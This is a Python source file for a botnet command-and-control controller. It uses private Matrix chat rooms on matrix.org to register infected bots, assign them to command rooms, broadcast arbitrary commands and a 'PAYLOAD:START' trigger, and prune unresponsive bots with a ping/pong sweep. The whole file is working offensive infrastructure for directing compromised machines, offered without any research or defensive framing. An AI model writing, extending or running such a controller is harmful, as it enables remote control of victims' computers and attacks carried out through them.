import random
import threading
import time
from matrix_client.client import MatrixClient, Room
from matrix_client.api import MatrixRequestError
from requests.exceptions import MissingSchema
import os
import sys
from dotenv import load_dotenv
from datetime import datetime
import json
from dataclasses import dataclass

load_dotenv()
USER_NAME = os.getenv('CONTROLLER_NAME')  
PASSWORD = os.getenv('CONTROLLER_PASSWORD')
BOTS_NAME = os.getenv('BOT_NAME')
ANNOUNCE_ROOM_ID = os.getenv('ANNOUNCE_ROOM_ID')
MATRIX_HOMESERVER = "https://matrix.org"


@dataclass
class Bot:
    hostname: str
    platform: str
    platform_version: str
    machine: str
    bot_id: str
    python_version: str
    
    def __init__(self, data: dict):
        self.hostname = data.get("hostname", "UNKNOWN")
        self.platform = data.get("platform", "UNKNOWN")
        self.platform_version = data.get("platform_version", "UNKNOWN")
        self.machine = data.get("machine", "UNKNOWN")
        self.bot_id = data.get("bot_id", "UNKNOWN")
        self.python_version = data.get("python_version", "UNKNOWN")


class CommandRoom:
    bots: dict[str, list[Bot, bool]]
    room: Room
    
    def __init__(self, room):
        self.room = room
        self.bots = {}
        
    def __str__(self):
        return f"{self.bots}"
    
    def add_bot(self, bot_data) -> Bot:
        bot: Bot = Bot(bot_data)
        self.bots[bot.bot_id] = [bot, True]
        return bot

    def remove_bot(self, bot_id):
        try:
            del self.bots[bot_id]
        except:
            print("Tried removing non-existing bot", bot_id)
        
    def set_active(self, bot_id) -> bool:
        """
        return False if bot_id doesnt exist
        """
        if bot_id not in self.bots:
            print("Couldn't find active bot")
            return False
        self.bots[bot_id][1] = True
        return True
    
    def set_all_inactive(self):
        for bot in self.bots.values():
            bot[1] = False
    
    def delete_inactive_bots(self):
        self.bots = {k: bot for k, bot in self.bots.items() if bot[1] == True}

    def leave(self) -> bool:
        return self.room.leave()

    def send_cmd(self, cmd) -> bool:
        return self.room.send_text(cmd)
        

class BotnetController:
    access_token: str
    announce_room: Room
    command_rooms: dict[str, CommandRoom]

    def __init__(self):
        self.device_id = "BOTCONTROLLER"
        self.command_room_prefix = "cmd_"
        self.client = MatrixClient(MATRIX_HOMESERVER)
        self.command_rooms = {}
        self.command_room_lock = threading.Lock()
        
        self.pong_window_start = 0
        self.pong_window_dur = 30

    def login(self):
        # login and sync
        try:
            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
            print("[+] Logged in as controller.")
        except MatrixRequestError as e:
            print(e)
            if e.code == 403:
                print("Bad username or password.")
                sys.exit(4)
            else:
                print("Check your sever details are correct.")
                sys.exit(2)
        except MissingSchema as e:
            print("Bad URL format.")
            print(e)
            sys.exit(3)
            
    def join_room(self, roomid) -> Room:
        try:
            room = self.client.rooms[roomid]
        except KeyError:
            room = self.client.join_room(roomid)
        return room
            
    def sync_rooms(self):
        joined_rooms: dict[str, Room] = self.client.rooms
        for id, room in joined_rooms.items():
            if room.name.startswith(self.command_room_prefix):
                with self.command_room_lock:
                    self.command_rooms[id] = CommandRoom(room)
            elif room.name == "announcements":
                self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)

    def send_command(self, command: str, room: CommandRoom):
        status = room.send_cmd(f"COMMAND:{command}")
        if not status:
            print("COULD NOT SEND COMMAND:", command)
        
    def send_to_all(self, command: str):
        with self.command_room_lock:
            for _, cmd_room in self.command_rooms.items():
                if len(cmd_room.bots) > 0:
                    self.send_command(command, cmd_room)
            
    def assign_bot(self, botdata, roomid):
        """
        Lock needs to be aquired
        """
        self.command_rooms[roomid].add_bot(botdata)
        
    def clear_room(self, room):
        self.send_command("CLEAR:ALL", room)
        
    def delete_room(self, room: CommandRoom):
        with self.command_room_lock:
            self.clear_room(room)
            room.leave()
            del self.command_rooms[room.room.room_id]

    def on_message(self, _room, event):
        msgbody: str = event["content"]["body"]
        action, info = msgbody.split(":", 1)
        
        if action == "CONNECT":
            if len(self.command_rooms) == 0:
                return
            msgbody = msgbody.removeprefix("CONNECT:")
            msgbody = json.loads(msgbody)
            botid = msgbody["bot_id"]
            # Uniform distr so should be fine
            room_id = random.choice(list(self.command_rooms.keys()))
            if not self.command_room_lock.acquire(False):
                return
            self.announce_room.send_text(
                f"RESOLVE {botid}:{room_id}"
            )
            self.assign_bot(msgbody, room_id)
            self.command_room_lock.release()
            
        elif action == "DISCONNECT":
            if not self.command_room_lock.acquire(False):
                return
            room_id, bot_id = info.rsplit(":", 1)
            self.command_rooms[room_id].remove_bot(bot_id)
            self.command_room_lock.release()
            
        elif action == "PONG":
            room_id, bot_id, pong_origin = info.rsplit(":", 2)
            pong_origin = float(pong_origin)
            if not (self.pong_window_start <= pong_origin <= self.pong_window_start + self.pong_window_dur):
                # pong too late :(
                print("PONG TOO LATE")
                self.send_command(f"CLEAR:{bot_id}", self.command_rooms[room_id])
                return
            
            with self.command_room_lock:
                self.command_rooms[room_id].set_active(bot_id)
            
    def create_room(self, name: str) -> Room:
        room: Room = self.client.create_room(name, is_public=False, invitees=[BOTS_NAME])
        room.set_room_name(name)
        return room
    
    def add_command_room(self, name: str):
        new_room = self.create_room(f"cmd_{name}")
        with self.command_room_lock:
            self.command_rooms[new_room.room_id] = CommandRoom(new_room)

    def start_payload_on_room(self, room: CommandRoom):
        self.send_command("PAYLOAD:START", room)
    
    def start_payload_all_rooms(self):
        for id, room in self.command_rooms.items():
            self.start_payload_on_room(room)

    def ping_loop(self):
        time.sleep(2)
        while True:
            time.sleep(10)
            # Mark
            with self.command_room_lock:
                for room in self.command_rooms.values():
                    room.set_all_inactive()

            self.pong_window_start = time.time()
            self.send_to_all("PING")
            time.sleep(self.pong_window_dur) # give time for pongs to come in
            
            # and Sweep
            with self.command_room_lock:
                for room in self.command_rooms.values():
                    room.delete_inactive_bots()
                    
    def run(self):
        self.login()
        self.sync_rooms()
        
        self.announce_room.add_listener(self.on_message)
        self.client.start_listener_thread()
        
        threading.Thread(name="PING THREAD", target=self.ping_loop, daemon=True).start()
        
        